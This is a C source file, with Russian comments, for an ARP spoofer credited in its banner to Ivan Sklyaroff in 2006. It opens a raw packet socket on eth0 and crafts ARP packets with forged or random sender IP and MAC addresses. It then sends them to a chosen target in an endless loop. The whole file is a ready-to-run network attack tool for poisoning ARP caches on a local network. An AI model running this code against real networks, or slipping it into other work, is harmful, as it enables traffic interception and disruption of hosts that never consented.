#include <stdio.h>
#include <stdlib.h> 
#include <string.h>
#include <sys/socket.h>
#include <features.h>    /* for the glibc version number */
#if __GLIBC__ >= 2 && __GLIBC_MINOR >= 1
#include <netpacket/packet.h>
#include <net/ethernet.h>     /* the L2 protocols */
#else
#include <asm/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>   /* The L2 protocols */
#endif
#include <linux/if.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/ioctl.h>

#define DEVICE "eth0"


struct arp_packet
{
  unsigned char	h_dest[ETH_ALEN];	/* destination eth addr	*/
  unsigned char	h_source[ETH_ALEN];	/* source ether addr	*/
  unsigned short h_proto;		/* packet type ID field	*/
  unsigned short ar_hrd;		/* format of hardware address	*/
  unsigned short ar_pro;		/* format of protocol address	*/
  unsigned char	ar_hln;		        /* length of hardware address	*/
  unsigned char	ar_pln;	        	/* length of protocol address	*/
  unsigned short ar_op; 		/* ARP opcode (command)		*/
  unsigned char	ar_sha[ETH_ALEN];	/* sender hardware address	*/
  unsigned char	ar_sip[4];		/* sender IP address		*/
  unsigned char	ar_tha[ETH_ALEN];	/* target hardware address	*/
  unsigned char	ar_tip[4];		/* target IP address		*/
};



/*-------------------------------------------*/
/* Преобразование MAC-адреса к сетевому виду */
/*-------------------------------------------*/
void get_mac(unsigned char* mac, char* optarg)
{
  int i = 0;
  char* ptr = strtok(optarg, ":-");
  while(ptr) {
    unsigned nmb;
    sscanf(ptr, "%x", &nmb);
    mac[i] = (unsigned char)nmb;
    ptr = strtok(NULL, ":-");
    i++;
  }
}

/*--------------------------------------*/
/* Преобразование имени узла в IP-адрес */
/*--------------------------------------*/
void get_ip(struct in_addr* in_addr,char* str)
{

  struct hostent *hp;

  if( (hp = gethostbyname(str)) == NULL)
 {
    herror("gethostbyname() failed");
    exit(-1);
  }
    
  bcopy(hp->h_addr, in_addr, hp->h_length);
}

/*------------------------*/
/* Главная функция main() */
/*------------------------*/
int main(int argc, char *argv[])
{
  struct sockaddr_ll s_ll;
  struct in_addr src_in_addr,targ_in_addr;
  struct arp_packet pkt;
  int sd;
  struct ifreq ifreq;
  char s_ip_addr[16];
  char s_eth_addr[19];
  int period = 2;

  fprintf(stderr, "========================================\n");  
  fprintf(stderr, "= ARP spoofer by Ivan Sklyaroff, 2006. =\n");
  fprintf(stderr, "========================================\n");

  if(argc < 5)
 {
    fprintf(stderr,
      "usage: %s <(source ip)||(random)> <(source mac)||(random)> <destination ip> <destination mac> [period(default 10 sec.)]\n", 
      argv[0]);
    exit(-1);
  }
  
  if (argc == 6)
    period = atoi(argv[5]);

  if ( (sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
    perror("socket() failed");
    exit(-1);
  }

  /* заполняем поля структуры sockaddr_ll */
  memset (&s_ll, 0, sizeof (struct sockaddr_ll));
  s_ll.sll_family = AF_PACKET;

  strncpy(ifreq.ifr_ifrn.ifrn_name, DEVICE, IFNAMSIZ);
  if (ioctl(sd, SIOCGIFINDEX, &ifreq) < 0) {
    perror("ioctl() failed");
    exit(-1);
  }

  s_ll.sll_ifindex = ifreq.ifr_ifru.ifru_ivalue;

  /* заполняем поля ARP-пакета */
  pkt.h_proto = htons(0x806);
  pkt.ar_hrd = htons(1);
  pkt.ar_pro = htons(0x800);
  pkt.ar_hln = 6;
  pkt.ar_pln = 4;
  pkt.ar_op = htons(1);
  
  get_mac(pkt.h_dest, argv[4]);
  memcpy(pkt.ar_tha, &pkt.h_dest, 6);
  get_ip(&targ_in_addr, argv[3]);

  /* в бесконечном цикле отправляем пакеты */
  while(1) {
    srandom(time(NULL));
    if(!strcmp(argv[1], "random")
)
    {
      sprintf(s_ip_addr, "%d.%d.%d.%d", random() % 255, random() % 255, random() % 255, random() % 255);
      get_ip(&src_in_addr, s_ip_addr);
    }
    else
      get_ip(&src_in_addr, argv[1]);
    
    if(!strcmp(argv[2], "random")
)
    {
      sprintf(s_eth_addr, "%x:%x:%x:%x:%x:%x", random() % 255, random() % 255, random() % 255, random() % 255, random() % 255, random() % 255);
      get_mac(pkt.ar_sha, s_eth_addr);
      memcpy(pkt.h_source, &pkt.ar_sha, 6);
    }
    else {
      get_mac(pkt.ar_sha, argv[2]);
      memcpy(pkt.h_source, &pkt.ar_sha, 6);
    }
  
    memcpy(pkt.ar_sip, &src_in_addr, 4);


    memcpy(pkt.ar_tip, &targ_in_addr, 4);


    if(sendto(sd, &pkt,sizeof(pkt),0, (struct sockaddr *)&s_ll,sizeof(struct sockaddr_ll)) < 0) {
      perror("sendto() failed");
      exit(-1);
    }
	
    sleep(period);
  }
 	
  return 0;
}

